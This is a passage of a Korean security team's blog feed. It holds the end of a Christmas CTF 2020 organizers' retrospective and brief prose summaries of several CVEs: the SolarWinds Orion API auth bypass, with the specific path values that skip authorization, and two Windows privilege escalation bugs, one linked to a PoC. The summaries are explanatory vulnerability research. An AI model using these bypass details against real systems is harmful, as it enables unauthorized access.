&#xC2DC;&#xC791;&#xB3C4; &#xC548; &#xD55C; &#xB450; &#xBB38;&#xC81C;&#xAC00; &#xB0A8;&#xC544;&#xC788;&#xACE0; &#xC800;&#xB294; &#xAE30;&#xB9D0;&#xACE0;&#xC0AC;&#xB97C; &#xB208;&#xC55E;&#xC5D0; &#xB450;&#xACE0; &#xC788;&#xB294; &#xAC78;&#xAE4C;&#xC694;?</p><p><img src="/2021/01/03/idioth/christmasctf2020-review/image11.png" alt></p><p><img src="/2021/01/03/idioth/christmasctf2020-review/image12.png" alt></p><blockquote><p>&#xC800;&#xB294; &#xADF8;&#xB807;&#xAC8C;.. &#xD559;&#xC810;&#xC744; &#xB193;&#xC544;&#xC8FC;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;</p></blockquote><p>&#xD559;&#xC810;&#xC744; &#xD3EC;&#xAE30;&#xD55C; &#xB300;&#xAC00;&#xB85C; &#xB098;&#xBA38;&#xC9C0; baby_RudOlPh&#xC640; picky_eater&#xB97C; &#xAD6C;&#xC0C1;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. <em><del>&#xB4F1;&#xAC00;&#xAD50;&#xD658;&#xC758; &#xBC95;&#xCE59;</del></em></p><p>picky_eater&#xB294; idioth &#xD300;&#xC7A5;&#xB2D8;&#xC758; &#xC544;&#xC774;&#xB514;&#xC5B4;&#xB97C; &#xC3D9; &#xBE7C;&#xC654;&#xC2B5;&#xB2C8;&#xB2E4;. address book&#xACFC; &#xACE0;&#xAD70;&#xBD84;&#xD22C;&#xD558;&#xACE0;&#xC788;&#xB358; &#xC800;&#xB97C; &#xBD88;&#xC30D;&#xD558;&#xAC8C; &#xBD24;&#xC5C8;&#xB098;&#xBD10;&#xC694;. &#x201C;&#xC774;&#xAC70; &#xB124;&#xAC00; &#xD560;&#xB798;?&#x201D; &#xB77C;&#xBA70; snake &#xAC8C;&#xC784; &#xCEE8;&#xC149;&#xC758; &#xC544;&#xC774;&#xB514;&#xC5B4;&#xB97C; &#xC8FC;&#xB354;&#xB77C;&#xACE0;&#xC694;. &#xADF8; &#xC815;&#xB3C4;&#xB85C; &#xBD88;&#xC30D;&#xD574; &#xBCF4;&#xC600;&#xB098;?;; &#xC544;&#xBB34;&#xD2BC; &#xAC10;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4; &#x314E;&#x314E;<br>&#xADF8;&#xB798;&#xB3C4; &#xB9CC;&#xB4E4; &#xB550; &#xC7AC;&#xBC0C;&#xAC8C; &#xB9CC;&#xB4E4;&#xC5C8;&#xB358; &#xBB38;&#xC81C;&#xC778; &#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p>&#xB9C8;&#xC9C0;&#xB9C9; baby_RudOlPh&#xB294; &#xB450; &#xC904;&#xB85C; &#xC124;&#xBA85;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. </p><blockquote><p>??? : (&#xD68C;&#xC758; &#xB3C4;&#xC911;) &#xB2D8;&#xB4E4; &#xC0DD;&#xAC01;&#xD574;&#xBCF4;&#xB2C8;&#xAE4C; &#xB274;&#xBE44;&#xC6A9; &#xD3EC;&#xB108;&#xBE14; &#xBB38;&#xC81C;&#xAC00; &#xC5C6;&#xB294;&#xB370;&#xC694;?</p></blockquote><p>&#xADF8;&#xB798;&#xC11C; &#xB9CC;&#xB4E4;&#xAC8C; &#xB41C; ARM(AArch64) ROP &#xBB38;&#xC81C;&#xC785;&#xB2C8;&#xB2E4;. &#xADF8;&#xB0E5; &#xB0B4;&#xBA74; &#xC7AC;&#xBBF8;&#xC5C6;&#xC796;&#xC544;&#xC694;! &#xADF8;&#xB798;&#xC11C; ARM&#xC744; &#xB07C;&#xC5B9;&#xC5C8;&#xC8E0;</p><p>(&#xC0AC;&#xC2E4; &#xAE30;&#xAC04; &#xB0B4;&#xC5D0; &#xC6D0;&#xB798; &#xC0DD;&#xAC01;&#xD588;&#xB358; type confusion &#xBB38;&#xC81C;&#xB97C; &#xBABB; &#xB9CC;&#xB4E4; &#xAC83; &#xAC19;&#xC544;&#xC11C; &#xB274;&#xBE44;&#xBB38;&#xC81C; &#xB0C8;&#xB2E4;&#xB294; &#xAC74; &#xC548; &#xBE44;&#xBC00;)</p><p>&#xC815;&#xB9AC;&#xD558;&#xACE0; &#xBCF4;&#xB2C8;&#xAE4C; &#xB354; &#xC798;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xC74C;&#xC5D0;&#xB3C4; &#xADF8;&#xB7EC;&#xC9C0; &#xBABB;&#xD574; &#xC544;&#xC26C;&#xC6B4; &#xAC10;&#xC815;&#xC774; &#xB9CE;&#xC774; &#xB0A8;&#xB294; &#xB300;&#xD68C;&#xB77C;&#xACE0; &#xC0DD;&#xAC01;&#xC774; &#xB4DC;&#xB124;&#xC694;. &#xB098;&#xC911;&#xC5D0; &#xB2E4;&#xB978; CTF&#xC5D0; &#xBB38;&#xC81C;&#xB97C; &#xCD9C;&#xC81C;&#xD560; &#xC218; &#xC788;&#xB294; &#xAE30;&#xD68C;&#xAC00; &#xC62C;&#xC9C4; &#xBAA8;&#xB974;&#xACA0;&#xC9C0;&#xB9CC; &#xAE30;&#xD68C;&#xAC00; &#xB41C;&#xB2E4;&#xBA74; &#xB354; &#xB9CE;&#xC774;, &#xCCA0;&#xC800;&#xD558;&#xAC8C; &#xC900;&#xBE44;&#xD574;&#xC11C; &#xC88B;&#xC740; &#xD004;&#xB9AC;&#xD2F0;&#xC758; &#xBB38;&#xC81C;&#xB97C; &#xB9CC;&#xB4E4; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xB178;&#xB825;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBD80;&#xC871;&#xD55C; &#xC81C; &#xBB38;&#xC81C;&#xB97C; &#xD480;&#xC5B4;&#xC8FC;&#xC2E0; &#xBAA8;&#xB4E0; &#xCC38;&#xAC00;&#xC790; &#xC5EC;&#xB7EC;&#xBD84;&#xB4E4;&#xAED8; &#xAC10;&#xC0AC;&#xC758; &#xB9D0;&#xC500;&#xB4DC;&#xB9BD;&#xB2C8;&#xB2E4;..!</p><h1 id="Fabu1ous"><a href="#Fabu1ous" class="headerlink" title="Fabu1ous"></a>Fabu1ous</h1><ul><li>Oil-system &amp; Match-maker</li></ul><p><img src="/2021/01/03/idioth/christmasctf2020-review/image13.png" alt></p><p>&#xBC84;&#xADF8; &#xC7A1;&#xB294; &#xAC74; &#xC815;&#xB9D0; &#xD798;&#xB4E0; &#xC791;&#xC5C5;&#xC774;&#xAD70;&#xC694;. &#xB300;&#xD68C; &#xB54C; oil-system&#xC758; &#xD480;&#xC774; &#xC218;&#xAC00; 20&#xC774;&#xB358;&#xB370; &#xC544;&#xB9C8; &#xBAA8;&#xB450; &#xC5B8;&#xC778;&#xD150;&#xB514;&#xB4DC;&#xC77C;&#xAC70;&#xB77C; &#xC0DD;&#xAC01;&#xD569;&#xB2C8;&#xB2E4;. Match-maker&#xB3C4; &#xBA54;&#xBAA8;&#xB9AC; leak &#xC911; &#xC5B8;&#xC778;&#xD150;&#xB514;&#xB4DC;&#xAC00; &#xD55C; &#xAC1C; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC194;&#xC9C1;&#xD788; &#xC544;&#xC8FC; &#xC870;&#xAE08; &#xC5B5;&#xC6B8;&#xD55C; &#xBD80;&#xBD84;&#xC774; &#xC788;&#xC9C0;&#xB9CC; &#xADF8;&#xAC8C; &#xBB34;&#xC2A8; &#xC758;&#xBBF8;&#xAC00; &#xC788;&#xACA0;&#xC2B5;&#xB2C8;&#xAE4C;&#x2026; &#xC774;&#xB7F0; &#xC0C1;&#xD669;&#xC774; &#xBC1C;&#xC0DD;&#xD55C; &#xC774;&#xC720;&#xB97C; &#xC801;&#xC5B4;&#xBCF4;&#xACE0; &#xC131;&#xCC30;&#xC758; &#xC2DC;&#xAC04;&#xC774;&#xB098; &#xAC00;&#xC838;&#xBD05;&#xC2DC;&#xB2E4;.</p><ol><li><p>&#xBC41;&#xC0C8;&#xAC00; &#xD669;&#xC0C8;&#xB97C; &#xB530;&#xB77C;&#xAC00;&#xBA74; &#xB2E4;&#xB9AC;&#xAC00; &#xCC22;&#xC5B4;&#xC9C4;&#xB2E4;</p><p> &#xBB38;&#xC81C;&#xB97C; &#xB9CC;&#xB4E4; &#xB54C;&#xAE4C;&#xC9C4; &#xBAB0;&#xB790;&#xB294;&#xB370; &#xC9C0;&#xAE08; &#xBCF4;&#xB2C8; &#xC815;&#xB9D0; &#xBCC4;&#xAC70; &#xC5C6;&#xB294; &#xBB38;&#xC81C;&#xB354;&#xAD70;&#xC694;. &#xD070; &#xD2C0;&#xB9CC; &#xBCF4;&#xBA74; &#xB9AC;&#xD134; &#xAC12;&#xC744; &#xC870;&#xC791;&#xD574; <code>win()</code> &#xD568;&#xC218;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xBB38;&#xC81C;&#xB4E4;&#xACFC; &#xD06C;&#xAC8C; &#xB2E4;&#xB97C; &#xAC8C; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD754;&#xD788; &#xC544;&#xB294; &#xB9CC;&#xD07C; &#xBCF4;&#xC778;&#xB2E4;&#xACE0; &#xD558;&#xC8E0;. &#xC5B4;&#xB824;&#xC6B4; &#xBB38;&#xC81C;&#xB97C; &#xB9CC;&#xB4E4;&#xACA0;&#xB2E4;&#xB294; &#xC758;&#xC695;&#xC740; &#xC55E;&#xC130;&#xC9C0;&#xB9CC; &#xC2E4;&#xB825;&#xC740; &#xC548; &#xB530;&#xB77C;&#xC8FC;&#xACE0; &#xACB0;&#xAD6D; &#xC4F8;&#xB370;&#xC5C6;&#xC774; &#xBCF5;&#xC7A1;&#xD55C; &#xB3D9;&#xC791;&#xC744; &#xD558;&#xB294; &#xBB38;&#xC81C;&#xAC00; &#xD0C4;&#xC0DD;&#xD55C; &#xAC70; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p></li><li><p>&#xB3CC;&#xB2E4;&#xB9AC;&#xB3C4; &#xB450;&#xB4E4;&#xACA8; &#xBCF4;&#xACE0; &#xAC74;&#xB108;&#xB77C;.</p><p> &#xCD5C;&#xC885; &#xAC80;&#xC0AC;&#xD558;&#xC138;&#xC694;. &#xB450; &#xBC88; &#xD558;&#xC138;&#xC694;. &#xCD5C;&#xC885; &#xAC80;&#xC0AC;&#xC758; &#xAC80;&#xC0AC;&#xB3C4; &#xD558;&#xC138;&#xC694;. &#xC774;&#xBC88; &#xC0AC;&#xAC74; &#xC774;&#xD6C4;&#xB85C; &#xC5B4;&#xB5A4; &#xC77C;&#xC774;&#xB4E0; &#xC27D;&#xAC8C; &#xD655;&#xC2E0;&#xC744; &#xAC16;&#xC9C4; &#xC54A;&#xC744; &#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p></li></ol><ul><li>No g</li></ul><p>&#xC124;&#xBB38; &#xC870;&#xC0AC;&#xC5D0; &#xC758;&#xD558;&#xBA74; &#xC774;&#xBC88; &#xB300;&#xD68C;&#xC5D0;&#xC11C; &#xD638;&#xBD88;&#xD638;&#xAC00; &#xAC00;&#xC7A5; &#xC2EC;&#xD588;&#xB358; &#xBB38;&#xC81C;&#xB124;&#xC694;. &#xC15C;&#xB85D;&#xD648;&#xC988; &#xC554;&#xD638;( &#xCDA4;&#xCD94;&#xB294; &#xC0AC;&#xB78C; &#xADF8;&#xB9BC; &#xC554;&#xD638; )&#xC640; &#xBE44;&#xC2B7;&#xD55C; &#xB290;&#xB08C;&#xC73C;&#xB85C; crypto&#xC640; misc &#xADF8; &#xC0AC;&#xC774; &#xC5B4;&#xB518;&#xAC00;&#xC758; &#xBB38;&#xC81C;&#xB97C; &#xB9CC;&#xB4E4;&#xB824;&#xACE0; &#xD574; &#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;. No g&#xB77C;&#xB294; &#xC81C;&#xBAA9;&#xC5D0;&#xC11C; &#xD78C;&#xD2B8;&#xB97C; &#xC5BB;&#xC5B4; &#xC27D;&#xAC8C; &#xD478;&#xC2E0; &#xBD84;&#xB4E4;&#xB3C4; &#xC788;&#xC9C0;&#xB9CC; &#xADF8;&#xB7EC;&#xC9C0; &#xBABB;&#xD558;&#xACE0; &#xAE30;&#xC0C1;&#xCC9C;&#xC678;&#xD55C; &#xC0BD;&#xC9C8;&#xC744; &#xD558;&#xC2E0; &#xBD84;&#xB4E4;&#xB3C4; &#xC788;&#xB354;&#xAD70;&#xC694;. &#xAC00;&#xBCCD;&#xAC8C; misc&#xB098; &#xD480;&#xBA74;&#xC11C; &#xBA38;&#xB9AC; &#xC2DD;&#xD788;&#xB824;&#xACE0; &#xBD24;&#xB2E4;&#xAC00; &#xACE0;&#xD1B5;&#xBC1B;&#xC73C;&#xC2E0; &#xBD84;&#xB4E4;&#xAED8; &#xC0AC;&#xC8C4;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#x314E;&#x314E;</p><p><img src="/2021/01/03/idioth/christmasctf2020-review/image14.png" alt></p><p>&#xC8C4;&#xC1A1;&#xD574;&#xC694; &#x3160;&#x3160;&#x3160;&#x3160;&#x3160;</p><p>2&#xB144; &#xC5F0;&#xC18D; Christmas CTF&#xC5D0; &#xB300;&#xD574; &#xC548; &#xC88B;&#xC740; &#xAE30;&#xC5B5;&#xB9CC; &#xB0A8;&#xB124;&#xC694;. &#xC62C;&#xD574;&#xB294; &#xAF2D; &#xC5EC;&#xCE5C; &#xC0AC;&#xADC0;&#xC5B4;&#xC11C; Christmas CTF &#xB9D0;&#xACE0; &#xB370;&#xC774;&#xD2B8;&#xD558;&#xB7EC; &#xAC00;&#xC57C;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p><img src="/2021/01/03/idioth/christmasctf2020-review/image15.png" alt></p><p><del>&#xC544;&#xC774;&#xC528;&#x2026; &#xB204;&#xAC00; &#xC5EC;&#xAE30;&#xB2E4; &#xC591;&#xD30C;&#xB97C; &#xAC00;&#xC838;&#xB2E4; &#xB193;&#xC740; &#xAC70;&#xC57C;!?</del></p>]]></content>
    
    
    <categories>
      
      <category>Daily-Life</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>ctf</tag>
      
      <tag>idioth</tag>
      
      <tag>christmas ctf 2020</tag>
      
      <tag>L0ch</tag>
      
      <tag>review</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-10148: SolarWinds Orion API auth bypass to RCE</title>
    <link href="/2021/01/02/fabu1ous/2021-01-02/"/>
    <url>/2021/01/02/fabu1ous/2021-01-02/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-10148">CVE-2020-10148</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>2019.4 HF 6 &#xC774;&#xC804; &#xBC84;&#xC804;</li><li>2020.2.1 HF 2 &#xC774;&#xC804; &#xBC84;&#xC804;</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>SolarWinds Orion platform&#xC5D0;&#xC11C; API &#xC778;&#xC99D; &#xC6B0;&#xD68C;&#xB97C; &#xD1B5;&#xD55C; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. FireEye&#xAC00; &#xC791;&#xB144; 12&#xC6D4; &#xACF5;&#xAC1C;&#xD55C; Sunburst backdoor&#xB85C; &#xC778;&#xD574; SolarWinds Orion platform&#xC740; &#xD070; &#xC774;&#xC288;&#xAC00; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8; &#xD6C4; SolarWinds Orion platform&#xC5D0; &#xB300;&#xD55C; &#xAE4A;&#xC740; &#xBD84;&#xC11D;&#xC774; &#xC9C4;&#xD589;&#xB418;&#xBA74;&#xC11C; &#xBC1C;&#xACAC;&#xB41C; &#xCDE8;&#xC57D;&#xC810; &#xC911; &#xD558;&#xB098;&#xAC00; CVE-2020-10148&#xC785;&#xB2C8;&#xB2E4;.</p><p>SolarWinds Orion platform&#xC740; &#xC2DC;&#xC2A4;&#xD15C; &#xBAA8;&#xB2C8;&#xD130;&#xB9C1; &#xBC0F; &#xAD00;&#xB9AC; &#xBAA9;&#xC801;&#xC73C;&#xB85C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC9C4; infrastructure&#xC785;&#xB2C8;&#xB2E4;. &#xC0AC;&#xC6A9;&#xC790;&#xB294; Orion Website&#xB97C; &#xD1B5;&#xD574; &#xC11C;&#xBC84;&#xC5D0; &#xC124;&#xCE58;&#xB41C; Orion&#xC5D0; &#xC811;&#xADFC;&#xD574; &#xC11C;&#xBC84;&#xB97C; &#xAD00;&#xB9AC;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBA70; SolarWinds Orion API&#xB97C; &#xC694;&#xCCAD;&#xD574; SolarWinds Orion platform&#xC744; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>URI&#xB97C; &#xD1B5;&#xD574; Orion &#xC11C;&#xBC84;&#xC5D0; &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0BC; &#xB54C; <code>Request.PathInfo</code> &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xC5D0; <code>WebResource.adx</code>, <code>ScriptResource.adx</code>, <code>i18n.ashx</code>, <code>Skipi18n</code>&#xB4F1;&#xC758; &#xAC12;&#xC744; &#xC9C0;&#xC815;&#xD558;&#xBA74; SolarWinds&#xAC00; <a href="https://docs.microsoft.com/en-us/dotnet/api/system.web.httpcontext.skipauthorization?view=netframework-4.8">SkipAuthorization</a> flag&#xB97C; &#xC124;&#xC815;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB85C; &#xC778;&#xD574; &#xD574;&#xCEE4;&#xAC00; &#xC778;&#xC99D; &#xC808;&#xCC28;&#xB97C; &#xAC74;&#xB108;&#xB6F0;&#xACE0; API &#xCEE4;&#xBA58;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>Fabu1ous</tag>
      
      <tag>rce</tag>
      
      <tag>authentication bypass</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-17057 : Microsoft Windows Uninitialized Pointer EoP</title>
    <link href="/2021/01/01/l0ch/2021-01-01/"/>
    <url>/2021/01/01/l0ch/2021-01-01/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blogs.360.cn/post/CVE-2020-17057%20detail%20and%20exploit.html">CVE-2020-17057 Microsoft Windows DirectComposition Uninitialized Pointer Privilege Escalation Vulnerability</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Microsoft Windows</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft&#xAC00; 2&#xB144; &#xC804;&#xC5D0; &#xBC1C;&#xACAC;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD328;&#xCE58;&#xD568;&#xC73C;&#xB85C;&#xC368; &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; Windows &#xCEE4;&#xB110; &#xBAA8;&#xB4DC;&#xC758; &#xADF8;&#xB798;&#xD53D; &#xAD6C;&#xC131; &#xC694;&#xC18C;&#xC778; <code>DirectComposition</code> &#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xCD08;&#xAE30;&#xD654;&#xB418;&#xC9C0; &#xC54A;&#xC740; pool &#xBA54;&#xBAA8;&#xB9AC; &#xCC38;&#xC870;&#xC785;&#xB2C8;&#xB2E4;.</p><p><code>DirectComposition</code> &#xC740; &#xB9AC;&#xC18C;&#xC2A4; &#xC0DD;&#xC131;/&#xD574;&#xC81C;/&#xC18D;&#xC131; &#xC124;&#xC815; &#xB4F1;&#xC758; &#xC791;&#xC5C5;&#xC744; &#xC218;&#xD589;&#xD558;&#xB294; <code>NtDCompositionProcessChannelBatchBuffer</code> syscall&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><p><code>DirectComposition::CInteractionTrackerMarshaler::SetBufferProperty</code> &#xC5D0;&#xC11C;&#xB294; &#xD55C; &#xC30D;&#xC758; &#xB9AC;&#xC18C;&#xC2A4; &#xAC1D;&#xCCB4;&#xB97C; &#xCC98;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;. &#xCCAB; &#xBC88;&#xC9F8; &#xB9AC;&#xC18C;&#xC2A4; &#xAC1D;&#xCCB4;&#xAC00; &#xCD08;&#xAE30;&#xD654;&#xB418;&#xACE0; &#xB450; &#xBC88;&#xC9F8; &#xB9AC;&#xC18C;&#xC2A4; &#xAC1D;&#xCCB4; &#xD0C0;&#xC785;&#xC774; <code>0x57</code>&#xC774; &#xC544;&#xB2C8;&#xB77C;&#xBA74; &#xB450; &#xBC88;&#xC9F8; &#xB9AC;&#xC18C;&#xC2A4; &#xAC1D;&#xCCB4;&#xAC00; &#xCD08;&#xAE30;&#xD654;&#xB418;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xD6C4; <code>DirectComposition::CInteractionTrackerMarshaler::ReleaseManipulationReferences</code> &#xC5D0;&#xC11C; &#xD560;&#xB2F9;&#xB41C; &#xD55C; &#xC30D;&#xC758; &#xB9AC;&#xC18C;&#xC2A4; &#xAC1D;&#xCCB4;&#xB97C; &#xD574;&#xC81C;&#xD558;&#xAE30; &#xC704;&#xD574; &#xBCC4;&#xB3C4;&#xC758; &#xAC80;&#xC99D; &#xC5C6;&#xC774;<code>DirectComposition::CApplicationChannel::ReleaseResource</code> &#xC744; &#xD638;&#xCD9C;&#xD558;&#xB294;&#xB370;, &#xC774;&#xB54C; &#xCD08;&#xAE30;&#xD654;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xB450; &#xBC88;&#xC9F8; &#xB9AC;&#xC18C;&#xC2A4; &#xAC1D;&#xCCB4; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xCC38;&#xC870;&#xD558;&#xAC8C; &#xB418;&#xC5B4; &#xCEE4;&#xB110; &#xD06C;&#xB798;&#xC2DC;&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB97C; &#xC545;&#xC6A9;&#xD558;&#xBA74; &#xB9AC;&#xC18C;&#xC2A4; &#xAC1D;&#xCCB4; &#xD3EC;&#xC778;&#xD130; &#xD14C;&#xC774;&#xBE14;&#xC744; spray &#xD574; &#xC784;&#xC758; &#xAC1D;&#xCCB4;&#xB97C; &#xD574;&#xC81C;&#xD558;&#xB294; &#xB4F1; &#xD574;&#xC81C;&#xB41C; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xC870;&#xC791;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>windows</tag>
      
      <tag>eop</tag>
      
      <tag>L0ch</tag>
      
      <tag>uninitialized pointer</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-0986: Windows splWOW64 Elevation of Privilege</title>
    <link href="/2020/12/31/idioth/2020-12-31/"/>
    <url>/2020/12/31/idioth/2020-12-31/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2096">Issue 2096: Windows: splWOW64 Elevation of Privilege</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows 10 2004 (19041.508)</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>5&#xC6D4;&#xC5D0; Kaspersky&#xB294; Windows splWOW64&#xC758; Elevation of Privilege&#xAC00; &#xC545;&#xC6A9;&#xB418;&#xACE0; &#xC788;&#xC74C;&#xC744; &#xBC1C;&#xACAC;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. Microsoft&#xC5D0;&#xC11C; 6&#xC6D4;&#xC5D0; &#xD328;&#xCE58;&#xB97C; &#xBC1C;&#xD45C;&#xD588;&#xC9C0;&#xB9CC; &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC218;&#xC815;&#xB418;&#xC9C0; &#xC54A;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>CVE-2020-0986&#xC740; GDI Print/Print Spooler API&#xC758; arbitrary pointer &#xC5ED;&#xCC38;&#xC870; &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC774;&#xC6A9;&#xD558;&#xC5EC; low integrity &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB294; splwow64.exe(medium integrity)&#xC5D0; LPC &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xBCF4;&#xB0B4; splwow64&#xC758; &#xBA54;&#xBAA8;&#xB9AC; &#xC601;&#xC5ED;&#xC5D0; &#xC4F0;&#xAE30; &#xAD8C;&#xD55C;&#xC744; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>splWOW64&#xB294; <code>GdiPrinterThunk</code>&#xB85C; LPC &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xC804;&#xB2EC;&#xD569;&#xB2C8;&#xB2E4;. <code>GdiPrinterThunk</code>&#xC758; <code>INDEX_DocumnetEvent</code>&#xC5D0; &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. <code>INDEX_DocumentEvent</code>&#xC758; &#xD578;&#xB4E4;&#xB7EC;&#xB294; printer command(LPC &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xB97C; &#xD1B5;&#xD574; &#xC870;&#xC791; &#xAC00;&#xB2A5;)&#xB97C; &#xD1B5;&#xD574; &#xC720;&#xD6A8;&#xD55C; &#xD578;&#xB4E4;&#xC744; &#xAC00;&#xC9C4; &#xD504;&#xB9B0;&#xD130;&#xC758; &#xBA85;&#xB839;&#xC778;&#xC9C0; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xD655;&#xC778;&#xD558;&#xACE0; &#xB098;&#xBA74; <code>DecodePointer</code> &#xD568;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; <code>fpDocumnetEvent</code>&#xC758; &#xC804;&#xC5ED; &#xBCC0;&#xC218;&#xC5D0; &#xC800;&#xC7A5;&#xB41C; &#xD568;&#xC218;&#xC758; &#xD3EC;&#xC778;&#xD130;&#xB97C; decode &#xD55C; &#xD6C4; decode &#xB41C; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xD1B5;&#xD574; &#xD568;&#xC218;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xACE0; <code>memcpy</code>&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xCEE4;&#xB294; <code>memcpy</code>&#xB97C; &#xD1B5;&#xD574; &#xBCF5;&#xC0AC;&#xB418;&#xB294; &#xB0B4;&#xC6A9;&#xACFC; &#xBC14;&#xC774;&#xD2B8; &#xC218;, destination&#xC744; &#xC81C;&#xC5B4;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>POC: <a href="https://bugs.chromium.org/p/project-zero/issues/attachment?aid=468393&amp;signed_aid=nGwe__E2zFBLc_iqlJ8lVQ==">https://bugs.chromium.org/p/project-zero/issues/attachment?aid=468393&amp;signed_aid=nGwe__E2zFBLc_iqlJ8lVQ==</a></p><p><a href="https://securelist.com/operation-powerfall-cve-2020-0986-and-variants/98329/">https://securelist.com/operation-powerfall-cve-2020-0986-and-variants/98329/</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>eop</tag>
      
      <tag>idioth</tag>
      
      <tag>splwow64</tag>
      
      <tag>arbitrary pointer dereference</tag>
      
      <tag>lpc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Windows Installer EoP 6th patch bypass</title>
    <link href="/2020/12/30/fabu1ous/2020-12-30/"/>
